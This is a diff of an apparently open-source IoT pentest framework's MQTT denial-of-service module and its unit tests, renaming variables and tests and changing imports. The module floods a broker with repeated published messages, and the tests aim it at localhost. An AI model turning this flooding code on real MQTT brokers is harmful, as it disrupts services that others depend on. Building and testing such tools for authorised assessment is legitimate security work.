@@ -7,21 +7,18 @@ import logging
 import time
 import unittest
 
-sys.path.append("../..")
-sys.path.append("..")
 import paho.mqtt.client as paho
 
-from Entity.attack import Attack
-from Entity.input_format import InputFormat
-from protocols import MQTT as PeniotMQTT
-
-"""
-    MQTT Protocol - DoS Attack Module
-    This class is used for populating repeated messages aiming to broker
-"""
+from ....Entity.attack import Attack
+from ....Entity.input_format import InputFormat
+from ....Utils.RandomUtil import random_generated_names
 
 
 class MQTTDoSAttack(Attack):
+    """
+    MQTT Protocol - DoS Attack Module
+    This class is used for populating repeated messages aiming to broker
+    """
     client = None
 
     # Input Fields
@@ -31,7 +28,7 @@ class MQTTDoSAttack(Attack):
     username = None
     password = None
     timeout = 0.01
-    stoppedFlag = False  # This flag will help us for a smooth exit
+    stopped_flag = False  # This flag will help us for a smooth exit
 
     # Misc Members
     logger = None
@@ -63,16 +60,16 @@ class MQTTDoSAttack(Attack):
 
     def stop_attack(self):
         self.logger.info("Published message count: {0}, exitting...".format(self.published_message_count))
-        if self.stoppedFlag is False:  # Stop the attack
+        if self.stopped_flag is False:  # Stop the attack
             self.client.loop_stop()
-            self.stoppedFlag = True
+            self.stopped_flag = True
         if self.client is not None:
             self.client.disconnect()  # Close the connection before exitting
         time.sleep(2)  # Sleep two seconds so the user can see the message
         # sys.exit(0)
 
     def pre_attack_init(self):
-        self.client = paho.Client(PeniotMQTT.get_random_mqtt_client_name())
+        self.client = paho.Client(random_generated_names.get_random_client_name())
         self.client.connect(self.host)
 
     def run(self):
@@ -86,7 +83,7 @@ class MQTTDoSAttack(Attack):
 
         if self.message is None or len(self.message.strip()) == 0:
             self.message = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(50))
-        while self.stoppedFlag is False:  # If we don't check this, GUI goes back but a separate thread keeps sending MQTT messages
+        while self.stopped_flag is False:  # If we don't check this, GUI goes back but a separate thread keeps sending MQTT messages
             try:
                 self.published_message_count += 1
                 if self.username is None:  # Authentication not required
@@ -104,7 +101,7 @@ class MQTTDoSAttack(Attack):
                 break
 
         self.client.loop_stop()
-        self.stoppedFlag = True
+        self.stopped_flag = True
 
 
 class TestMQTTDoSAttack(unittest.TestCase):
@@ -114,22 +111,22 @@ class TestMQTTDoSAttack(unittest.TestCase):
     def tearDown(self):
         pass
 
-    def testName(self):
+    def test_name(self):
         self.assertEqual("MQTT DoS Attack", self.mqtt_dos_attack.get_attack_name())
 
-    def testInputs(self):
+    def test_inputs(self):
         inputs = self.mqtt_dos_attack.get_inputs()
         self.assertIsNotNone(inputs)
         self.assertGreater(len(inputs), 0, "Non inserted inputs")
         self.assertEquals(len(inputs), 6)
 
-    def testNonInitializedInputs(self):
+    def test_non_initialized_inputs(self):
         inputs = self.mqtt_dos_attack.get_inputs()
         for _input in inputs:
             value = getattr(self.mqtt_dos_attack, _input.get_name())
             self.assertTrue(value is None or type(value) == _input.get_type())
 
-    def testAfterGettingInputs(self):
+    def test_after_getting_inputs(self):
         example_inputs = ["a.b.c.d", "peNiOt", "pen-user", "pen-pass", "peniot-payload", 13.2]
         for index, _input in enumerate(example_inputs):
             self.mqtt_dos_attack.inputs[index].set_value(_input)
@@ -144,7 +141,7 @@ class TestMQTTDoSAttack(unittest.TestCase):
             value = getattr(self.mqtt_dos_attack, _input.get_name())
             self.assertEqual(example_inputs[index], value)
 
-    def testDoSAttack(self):
+    def test_dos_attack(self):
         def run_attack():
             example_inputs = ["127.0.0.1", "peniot/test", None, None, "peniot-pay", 0.01]
             for index, _input in enumerate(example_inputs):
